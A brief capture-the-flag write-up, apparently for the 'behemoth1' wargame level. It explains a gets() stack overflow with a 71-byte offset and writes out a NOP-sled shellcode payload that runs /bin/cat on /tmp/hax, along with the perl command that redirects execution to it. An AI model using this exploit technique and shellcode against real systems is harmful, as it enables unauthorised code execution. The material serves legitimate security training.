@@ -1,0 +1,11 @@
+This level is basically just a throwback to narnia. initially it looks a lot like the last level, but the assembly
+dump is just a gets() call and a puts() that says you failed to authenticate.
+
+The buffer offset to write over main's return address is 71 bytes. An input of $(perl -e 'print "A" x 71 . "DDDD"')
+successfully attempts to return to DDDD. Let's pop some shellcode in this.
+
+    export EVIL=$(perl -e 'print "\x90" x 512 . "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x68\x61\x78\x68\x2f\x74\x6d\x70\x89\xe2\x50\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
+
+EVIL should be around roughly 0xffffdd09, so we'll want to aim for 0xffffde09.
+
+    perl -e 'print "A" x 71 . "\x09\xde\xff\xff"' | /behemoth/behemoth1
